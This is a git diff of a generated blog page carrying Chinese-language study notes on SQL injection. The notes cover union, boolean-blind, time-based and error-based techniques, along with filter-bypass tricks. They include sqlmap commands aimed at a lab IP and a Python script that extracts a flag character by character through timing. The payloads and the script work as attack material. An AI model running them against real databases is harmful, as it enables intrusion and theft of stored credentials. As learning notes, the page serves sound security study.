@@ -193,7 +193,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"post_name","path":"2024/07/06/post-name/"},{"title":"Hello World","path":"2024/07/05/hello-world/"},{"title":"sql注入","path":"2022/11/07/sql/"}]`)
+  const posts = JSON.parse(`[{"title":"sql注入","path":"2022/11/07/sql/"},{"title":"Hello World","path":"2024/07/05/hello-world/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -327,7 +327,7 @@
       </h5>
       <p class="main-left--subtitle">
         <span>文章数目：</span>
-        <span>3 篇</span>
+        <span>2 篇</span>
       </p>
       <p class="main-left--subtitle">
         <span>最近动态：</span>
@@ -335,7 +335,7 @@
       </p>
       <p class="main-left--subtitle">
         <span>上线时间：</span>
-        <span>1天</span>
+        <span>2天</span>
       </p>
       <p class="main-left--subtitle">
         <span>当前版本：</span>
@@ -373,63 +373,88 @@
       </div>
     </div>
     <article class="article-content markdown-body">
-      <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>web应用程序对用户输入的数据过滤不严，导致用户输入的数据被当成sql语句执行</p>
+      <h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>web应用程序对用户输入的数据过滤不严，导致用户输入的数据被当成sql语句执行</p>
 <h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p><code>select * from articles where id=1</code></p>
 <p><code>select * from articles where id=(1)</code></p>
 <h4 id="burpsuit"><a href="#burpsuit" class="headerlink" title="burpsuit"></a>burpsuit</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数字型注入:<span class="variable">$sql</span>=<span class="string">&quot;select * from person where id = <span class="subst">&#123;$id&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>抓包后右键，选中repeater</p>
 <p>输入后点send，观察respose</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526214008294.png" alt="image-20240526214008294"></p>
 <img src="/images/1.png" class="" title="示例图片 图片描述">
-
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img 1.png This is an image %&#125;</span><br></pre></td></tr></table></figure>
-
-
 
 <p>要用+连接，表示空格不能用空格，或者是用%20来表示</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526214108870.png" alt="image-20240526214108870"></p>
+<img src="/images/2.png" class="" title="示例图片 图片描述">
+
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526214219422.png" alt="image-20240526214219422"></p>
+<img src="/images/3.png" class="" title="示例图片 图片描述">
+
 <p><code>?id=-2+union+select+1,2,table name,4, 5+from+information_ schema.tables+where+table_schema=database()</code></p>
 <p>判断前面是错误的，执行后面的sql语句，可以得到表名</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526214718422.png" alt="image-20240526214718422"></p>
+<img src="/images/4.png" class="" title="示例图片 图片描述">
+
 <p>当过滤单引号时，把字符串换成十六进制<img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526214905885.png" alt="image-20240526214905885"></p>
+<img src="/images/5.png" class="" title="示例图片 图片描述">
+
 <p>查询表名为admin的username和password字段，用concat 函数连接</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526215154988.png" alt="image-20240526215154988"></p>
+<img src="/images/6.png" class="" title="示例图片 图片描述">
+
+
+
 <h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p><code>select * from articles where id=&#39;1&#39;</code></p>
 <p><code>select * from articles where id=&quot;1&quot;</code></p>
 <p><code>select * from articles where id=(&#39;1&#39;)</code></p>
 <p>sql语句中的()不代表实际含义，只作为一个分组处理。</p>
-<h4 id="burpsuit-1"><a href="#burpsuit-1" class="headerlink" title="burpsuit"></a>burpsuit</h4><p>注释符#、–+闭合引号<br><code>select * from articles where id=&#39;-1&#39; uion注入利用语句 --+&#39; or  &#39;1 &#39;</code> </p>
+<h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>注释符#、–+闭合引号<br><code>select * from articles where id=&#39;-1&#39; uion注入利用语句 --+&#39; or  &#39;1 &#39;</code> </p>
 <h3 id="sql注入可能出现的位置"><a href="#sql注入可能出现的位置" class="headerlink" title="sql注入可能出现的位置"></a>sql注入可能出现的位置</h3><p>sql注入漏洞出现的位置存在于用户可控输入范围，用户输入的位置由以下内容组成:</p>
 <p>1、URL提交的参数<br>2、HTTP请求主体(POST提交的数据)<br>3、HTTP请求头(User-Agent、Referer、cookie等)</p>
 <p>以上输入位置只要提交的数据 未完美处理 被带入到SQL执行，就存在SQL注入漏洞</p>
-<h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><h4 id="联合注入原理"><a href="#联合注入原理" class="headerlink" title="联合注入原理"></a>联合注入原理</h4><p>在SQL语句中查询数据时，使用select 相关语句与where 条件子句筛选符合条件的记录。</p>
-<p><code>select * from person where id =1;#在person表中，筛选出id=1的记录</code></p>
+<h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>在SQL语句中查询数据时，使用select 相关语句与where 条件子句筛选符合条件的记录。</p>
+<p>1.<code>select * from person where id =1;#在person表中，筛选出id=1的记录</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526203519818.png" alt="image-20240526203519818"></p>
+<img src="/images/7.png" class="" title="示例图片 图片描述">
+
 <p>数据库提供联合查询，使得可以将两条SQL查询语句的结果进行连接。务必注意:两者的字段数必须一致。</p>
-<p><code>select * from person where id=1 union select 1,2,database(),4,5;</code></p>
+<p>2.<code>select * from person where id=1 union select 1,2,database(),4,5;</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526203737523.png" alt="image-20240526203737523"></p>
-<p>判断联合查询语句中的字段数时，可以使用order by num 。当依次增大num时，如果出现错误，那么第一条SQL查询语句的结果字段数就为num-1.</p>
+<img src="/images/8.png" class="" title="示例图片 图片描述">
+
+<p>3.判断联合查询语句中的字段数时，可以使用order by num 。当依次增大num时，如果出现错误，那么第一条SQL查询语句的结果字段数就为num-1.</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526203848526.png" alt="image-20240526203848526"></p>
-<p>(1)<code>数据库提供联合查询，使得可以将两条S0L查询语句的结果进行连接。务必注意:两者的字段数必须一致，</code></p>
+<img src="/images/9.png" class="" title="示例图片 图片描述">
+
+<p>(1)数据库提供联合查询，使得可以将两条S0L查询语句的结果进行连接。务必注意:两者的字段数必须一致，&#96;</p>
 <p><code>select *from person where id =1 union select 1,2,database(),4,5;</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526210431742.png" alt="image-20240526210431742"></p>
+<img src="/images/10.png" class="" title="示例图片 图片描述">
+
 <p>判断联合查询语句中的字段数时，可以使用order by num 。当依次增大num时，如果出现错误，那么第一条SQL查询语句的结果字段数就为num-1.</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526210513477.png" alt="image-20240526210513477"></p>
+<img src="/images/11.png" class="" title="示例图片 图片描述">
+
 <p>（2）查询数据库名、版本号、用户信息</p>
 <p><code>select * from person where id = 1 union select 1,2,database(),version(),user();</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526210614655.png" alt="image-20240526210614655"></p>
+<img src="/images/12.png" class="" title="示例图片 图片描述">
+
 <p>(3)查询数据表名</p>
 <p><code>select * from person where id = 1 union select 1,2,(select table _name from information_schema.tables where table_schema=database() limit 0,1),4,5;或</code></p>
 <p>limit 0,1是行，第一行</p>
 <p>limit 1,1是第二行</p>
 <p><code>select * from person where id = 1 union select 1,2,(select group_concat(table_name) from information schema.tables where table_schema=database()),4,5;</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526211405372.png" alt="image-20240526211405372"></p>
+<img src="/images/13.png" class="" title="示例图片 图片描述">
+
 <p>（4）查询字段名</p>
 <p><code>select * from person where id = 1 union select 1,2,(select group_concat(column_name) frominformation_schema.columns where table_name=&#39;admin&#39;),4,5;或</code></p>
 <p>当有单引号过滤时可以把字符串换成16进制</p>
 <p><code>select * from person where id = 1 union select 1,2,(select group_concat(column_name) frominformation_schema.columns where table_name=0x61646D696E),4,5;</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526212137477.png" alt="image-20240526212137477"></p>
+<img src="/images/14.png" class="" title="示例图片 图片描述">
+
 <p>(5)concat函数</p>
 <p><code>select * from person where id = 1 union select 1,2, (select concat (username, 0x5c, password)from admin limit 0,1),4,5;</code></p>
 <p>0x5c是,断开字符串，用\连</p>
@@ -446,11 +471,17 @@
 
 
 
-<h4 id="Burpsuite-数字型联合注入利用"><a href="#Burpsuite-数字型联合注入利用" class="headerlink" title="Burpsuite 数字型联合注入利用"></a>Burpsuite 数字型联合注入利用</h4><p>实验PHP源代码:</p>
+<h4 id="数字型联合注入利用"><a href="#数字型联合注入利用" class="headerlink" title="数字型联合注入利用"></a>数字型联合注入利用</h4><p>实验PHP源代码:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">`<span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>];`</span><br><span class="line">`<span class="variable">$conn</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span><span class="string">&#x27;root&#x27;</span><span class="string">&#x27;123456&#x27;</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;连接数据库失败!&#x27;</span>);`</span><br><span class="line">`<span class="title function_ invoke__">mysql_query</span>(<span class="string">&#x27;set names utf-8&#x27;</span>,<span class="variable">$conn</span>);`</span><br><span class="line">`<span class="title function_ invoke__">mysql_query</span>(<span class="string">&#x27;use web_sql&#x27;</span>,<span class="variable">$conn</span>);`</span><br><span class="line">`<span class="variable">$sql</span>=<span class="string">&quot;select *from person where id = iSid&#125;&quot;</span>;`</span><br><span class="line">`<span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>,Sconn)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());`</span><br><span class="line"> <span class="variable">$arr</span>=<span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$res</span>)   </span><br><span class="line">    </span><br></pre></td></tr></table></figure>
 
 <p>order by </p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526220735666.png" alt="image-20240526220735666"></p>
+<img src="/images/15.png" class="" title="示例图片 图片描述">
+
+
+
+
+
 <h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>利用 逻辑关系对SQL语句进行“干预”，例如 select*from article where id&#x3D;1 and 1&#x3D;1 恒为真，输出正确情况,如果拼接 and 1&#x3D;2 恒为假，输出错误情况。</p>
 <h4 id="关键字and过滤解决"><a href="#关键字and过滤解决" class="headerlink" title="关键字and过滤解决"></a>关键字and过滤解决</h4><p>用&amp;&amp;代替and</p>
 <p><code>?id=1%26%261   %26是&amp;的url编码</code></p>
@@ -472,44 +503,83 @@
 
 
 <p>preg_match(‘&#x2F;union&#x2F;i,$sql)，完全过滤.</p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526223453177.png" alt="image-20240526223453177"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;连接数据库失败!&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&#x27;set names utf-8&#x27;</span>,Sconn);</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&#x27;use web_sql&#x27;</span>,Sconn);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select *from person where id = fSid&#125;&quot;</span>:</span><br><span class="line"><span class="variable">$res</span> =<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>,<span class="variable">$conn</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(Sres);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;success&quot;</span>;&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526223646663.png" alt="image-20240526223646663"></p>
+<img src="/images/17.png" class="" title="示例图片 图片描述">
+
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526223731710.png" alt="image-20240526223731710"></p>
+<img src="/images/18.png" class="" title="示例图片 图片描述">
+
 <p>&#x2F;?id&#x3D;1+and+length(database())&gt;&#x3D;num</p>
 <p>1.获取数据库名称<br>and+length(database())&gt;&#x3D;num #根据页面返回长度判断数据库长度</p>
 <p>and+substr(database(),1,1)&#x3D;’a’#逐字遍历(替换a) #substr substring mid 都可以截取字符串其中一部分如果过滤引号，可以适用 and+ascii(substr(database(),1.1))&#x3D;96 #根据ascii值判断 ord 也可以实现<br>遍历数据库长度的字符，最终找到数据名称。</p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526224150065.png" alt="image-20240526224150065"><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526224217684.png" alt="image-20240526224217684"></p>
-<p>2.获取数据表名称<br>and ord(mid((select column name from information _schema.columns where table_name&#x3D;’admin’ limit2,1),1.1))&#x3D; 96<br>其中 limit m,n m为起始位置,n为长度。limit 0,1 获取第一个数据。</p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526224150065.png" alt="image-20240526224150065"></p>
+<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526224217684.png" alt="image-20240526224217684"></p>
+<img src="/images/19.png" class="" title="示例图片 图片描述">
+
+<img src="/images/20.png" class="" title="示例图片 图片描述">
+
+
+
+<p>2.获取数据表名称</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ord(mid((<span class="keyword">select</span> <span class="keyword">column</span> name <span class="keyword">from</span> information _schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> limit2,<span class="number">1</span>),<span class="number">1.1</span>))<span class="operator">=</span> <span class="number">96</span></span><br></pre></td></tr></table></figure>
+
+<p>其中 limit m,n m为起始位置,n为长度。limit 0,1 获取第一个数据。</p>
 <p>3、获取字段名称and ord(mid((select column_name from information_schema.columns where table name&#x3D;’admin’ limit2,1),1,1))&#x3D; 97</p>
 <p>4.获取数值部分and ord(mid((select * from 表名),1,1))&#x3D; 97</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526224421105.png" alt="image-20240526224421105"></p>
-<p><code>sqlmap -u &quot;http://192.168.0.102/01S0L/04Boolean/?id=1&quot; --technique B --dbs</code></p>
+<img src="/images/21.png" class="" title="示例图片 图片描述">
+
+<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p><code>sqlmap -u &quot;http://192.168.0.102/01S0L/04Boolean/?id=1&quot; --technique B --dbs</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526224520784.png" alt="image-20240526224520784"></p>
+<img src="/images/22.png" class="" title="示例图片 图片描述">
+
 <p>&#96;&#96;sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.0.102/01S0L/04Boolean/?id=1">http://192.168.0.102/01S0L/04Boolean/?id=1</a>“ –technique B -D web_shell –tables&#96;         </p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527094459236.png" alt="image-20240527094459236"></p>
+<img src="/images/23png" class="" title="示例图片 图片描述">
+
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240526224712592.png" alt="image-20240526224712592"></p>
+<img src="/images/24.png" class="" title="示例图片 图片描述">
+
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527094533569.png" alt="image-20240527094533569"></p>
+<img src="/images/25.png" class="" title="示例图片 图片描述">
+
 <p><code>sqlmap -u &quot;http://192.168.0.102/01S0L/04Boolean/?id=1&quot; --technique B -D web_shell -t admin -c &quot;password&quot; --dump</code></p>
 <h4 id="过滤逗号的技巧"><a href="#过滤逗号的技巧" class="headerlink" title="过滤逗号的技巧"></a>过滤逗号的技巧</h4><p>用到mid(),substr(),limit</p>
 <p><code>mid(username,1,1)  等价于 mid(username from 1 for 1)</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527101220546.png" alt="image-20240527101220546"></p>
+<img src="/images/26.png" class="" title="示例图片 图片描述">
+
 <p><code>substr(username,1,1)  等价于 substr(username from 1 for 1)</code></p>
 <p><code>select * from admin limit 1,1 等价于 select * from admin limit 1 offset 1;</code></p>
 <h4 id="过滤比较运算符技巧"><a href="#过滤比较运算符技巧" class="headerlink" title="过滤比较运算符技巧"></a>过滤比较运算符技巧</h4><p><code>greatest(n1，n2，n3...):返回n中的最大值</code></p>
 <p><code>greatest(ascii(substr(username,1,1)),1)=97;</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527101601020.png" alt="image-20240527101601020"></p>
+<img src="/images/27.png" class="" title="示例图片 图片描述">
+
 <p><code>least(n1,n2,n3...):返回n中的最小值</code></p>
 <p><code>strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，返回 -1,等于返回0,大于返回 1</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527101646074.png" alt="image-20240527101646074"></p>
+<img src="/images/28.png" class="" title="示例图片 图片描述">
+
 <p><code>substr(username,1,1)in(&#39;t&#39;);</code><br><code>between a and b:范围在a-b之间</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527101812020.png" alt="image-20240527101812020"></p>
+<img src="/images/29.png" class="" title="示例图片 图片描述">
+
 <p><code>and substr(username,1,1)between &#39;a&#39; and &#39;t&#39;;</code><br><code>and substr(username,1,1)between &#39;t&#39; and &#39;t&#39;:</code></p>
 <h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527101939607.png" alt="image-20240527101939607"></p>
+<img src="/images/30.png" class="" title="示例图片 图片描述">
+
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527102001821.png" alt="image-20240527102001821"></p>
+<img src="/images/31.png" class="" title="示例图片 图片描述">
+
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527102131209.png" alt="image-20240527102131209"></p>
+<img src="/images/32.png" class="" title="示例图片 图片描述">
+
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527102203313.png" alt="image-20240527102203313"></p>
+<img src="/images/33.png" class="" title="示例图片 图片描述">
+
 <h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>sql时间类型的盲注本质是利用插入的SQL语句执行造成时间延迟，插入的SQL语句中包含延时执行的语句，当数据库执行该语句时，会延时执行。</p>
 <p><code>Mysql中常用的延时执行函数</code></p>
 <p><code>sleep(num)</code></p>
@@ -519,10 +589,16 @@
 <p><code>例如：</code></p>
 <p><code>select * from admin where id =1 and (if(length(database())&gt;0,sleep(3),1));</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527200847513.png" alt="image-20240527200847513"></p>
+<img src="/images/34.png" class="" title="示例图片 图片描述">
+
 <p><code>benchmark函数</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527200920551.png" alt="image-20240527200920551"></p>
+<img src="/images/35.png" class="" title="示例图片 图片描述">
+
 <p>根据回显时间来判断数据库的长度</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527201006663.png" alt="image-20240527201006663"></p>
+<img src="/images/36.png" class="" title="示例图片 图片描述">
+
 <h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>1.数据库长度</p>
 <p><code>id=1 and if(length(database())=7,sleep(3),null)</code></p>
 <p>2.数据库名称</p>
@@ -534,20 +610,26 @@
 <p><code>id=1 and if(substr((select column_name from information_schema.columns where tables_name=&#39;admin&#39;limit 1,1),1,1)=&#39;u&#39;,sleep(3),null)</code></p>
 <p>5.获取数据内容</p>
 <p><code>id=1 and if((substr((select password from admin limit 0,1),1,1)=&#39;f&#39;),sleep(3),null)</code></p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527202350795.png" alt="image-20240527202350795"></p>
-<p>延时盲注python自动化利用</p>
-<p>1.寻找payload+绕过技巧</p>
+<p>![image-20240527202350795](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527202350795.png</p>
+<h4 id="python自动化利用"><a href="#python自动化利用" class="headerlink" title="python自动化利用"></a>python自动化利用</h4><p>1.寻找payload+绕过技巧</p>
 <p>2.python自动化请求url+payload通过超时判断是否正确</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符集，包含可能的字符</span></span><br><span class="line">dic = <span class="string">&quot;&#125;&#123;-0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储猜测得到的标志（flag）</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历我们要获取的标志（flag）的字符位置索引</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">20</span>):  <span class="comment"># 假设标志（flag）最多有20个字符</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> dic:  <span class="comment"># 遍历字符集，逐字符猜测</span></span><br><span class="line">        <span class="comment"># 用户自定义的URL</span></span><br><span class="line">        url = <span class="string">&quot;http://example.com/vulnerable_endpoint&quot;</span>  <span class="comment"># 替换为实际目标URL</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 用户自定义的payload，替换其中的数值</span></span><br><span class="line">        <span class="comment"># 例如，假设payload是用于盲注的SQL语句的一部分</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=-1/**/or/**/mid((select/**/flag/**/from/**/flag_table/**/limit/**/1)/**/from/**/<span class="subst">&#123;n+<span class="number">1</span>&#125;</span>/**/for/**/1)/**/in/**/(&#x27;<span class="subst">&#123;c&#125;</span>&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 拼接URL和payload</span></span><br><span class="line">        full_url = url + payload</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送HTTP GET请求</span></span><br><span class="line">            response = requests.get(url=full_url, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 判断条件，通常是基于特定响应特征的盲注逻辑</span></span><br><span class="line">            <span class="comment"># 在这个例子中，假设服务器在匹配时超时</span></span><br><span class="line">            <span class="keyword">if</span> response.elapsed.total_seconds() &gt;= <span class="number">3</span>:  <span class="comment"># 可以根据实际情况调整</span></span><br><span class="line">                flag += c  <span class="comment"># 将正确的字符拼接到标志中</span></span><br><span class="line">                <span class="built_in">print</span>(flag)  <span class="comment"># 输出当前猜测得到的部分标志</span></span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 退出当前字符集的循环，继续猜测下一个字符</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            <span class="comment"># 如果发生超时异常，表示猜测的字符是正确的</span></span><br><span class="line">            flag += c  <span class="comment"># 将正确的字符拼接到标志中</span></span><br><span class="line">            <span class="built_in">print</span>(flag)  <span class="comment"># 输出当前猜测得到的部分标志</span></span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 退出当前字符集的循环，继续猜测下一个字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印最终猜测得到的标志</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527203805694.png" alt="image-20240527203805694"></p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527203929398.png" alt="image-20240527203929398"></p>
+<img src="/images/37.png" class="" title="示例图片 图片描述">![image-20240527203929398](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527203929398.png)
+
+<img src="/images/38.png" class="" title="示例图片 图片描述">
+
 <p>substr函数只能从的第一个 字段的第一个位置开始截取</p>
 <p>构造payload</p>
 <p>获取字段名</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527204719529.png" alt="image-20240527204719529"></p>
+<img src="/images/39.png" class="" title="示例图片 图片描述">
+
 <p>获取字段内容</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527204757389.png" alt="image-20240527204757389"></p>
+<img src="/images/40.png" class="" title="示例图片 图片描述">
+
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p><code>利用mysql数据库报错，导致输出查询数据信息</code></p>
 <p><code>floor(rand(0)*2)</code></p>
 <p><code>select count(*) from information_schema .tables group by concat(verison(),floor(rand(0)*2));</code></p>
@@ -557,15 +639,24 @@
 <p><code>payload:</code></p>
 <p><code>and (select 1 from (select count(*),concat(version(),floor(rand(8)*2))x from information_schema.tables group by x)a)</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527205532471.png" alt="image-20240527205532471"></p>
+<img src="/images/41.png" class="" title="示例图片 图片描述">
+
 <h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p><code>updatexml (XML_document,XPath_string,new_valu)</code><br><code>第一个参数:XML_document是String格式，为XML文档对象的名称，文中为Doc</code><br><code>第二个参数:XPath_string(Xpath格式的字符串)，如果不了解Xpath语法，可以在网上查找教程</code></p>
 <p><code>第三个参数:new_value，String格式，替换查找到的符合条件的数据</code></p>
